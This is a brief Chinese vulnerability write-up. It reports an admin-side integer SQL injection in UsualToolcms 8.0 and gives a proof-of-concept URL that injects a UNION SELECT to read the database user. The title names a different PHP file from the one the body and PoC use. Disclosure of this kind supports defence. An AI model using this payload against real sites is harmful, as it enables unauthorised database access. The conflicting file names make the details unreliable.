UsualToolcms 8.0 a\_users\_level.php 后台int型注入
==================================================

一、漏洞简介
------------

后台a\_book\_category.php int型注入

二、漏洞影响
------------

UsualToolcms 8.0

三、复现过程
------------

该php文件下另外一个触发点：

![2.png](./.resource/UsualToolcms8.0a_users_level.php后台int型注入/media/rId24.png)

### poc

    http://www.0-sec.org/cmsadmin/a_book_category.php?t=mon&id=-1%20union%20select%201,user(),3%23

![2.png](./.resource/UsualToolcms8.0a_users_level.php后台int型注入/media/rId26.png)

参考链接
--------

> https://xz.aliyun.com/t/8100
